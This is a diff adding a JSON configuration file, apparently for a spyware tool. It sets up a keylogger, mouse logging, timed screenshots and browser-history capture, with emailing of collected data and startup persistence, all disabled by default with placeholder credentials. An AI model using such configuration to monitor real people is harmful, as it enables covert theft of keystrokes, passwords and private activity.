@@ -1,0 +1,40 @@
+{
+    "move_location": "",
+    "logs_location": ".",
+    "create_startup_shortcut": false,
+
+    "keylogger": {
+        "enabled": false,
+        "filename": "keylog.txt"
+    },
+
+    "mouselogger": {
+        "enabled": false,
+        "string_format": "[{btn}MB_{x},{y}]",
+        "ignore_same": true
+    },
+
+    "screenshots": {
+        "enabled": false,
+        "filename_format": "prtscr_{index}.png",
+        "interval": 60,
+        "inactivity_skip": true
+    },
+
+    "history": {
+        "enabled": false,
+        "filename_format": "{browser}_history.txt",
+        "interval": 300,
+        "limit": 100
+    },
+
+    "email": {
+        "enabled": false,
+        "email": "example@gmail.com",
+        "password": "aaaa bbbb cccc dddd",
+        "interval": 7200,
+        "delete_after": false
+    },
+
+    "entropy": "https://www.random.org/strings/?num=1&len=32&digits=on&upperalpha=on&loweralpha=on&format=plain"
+}
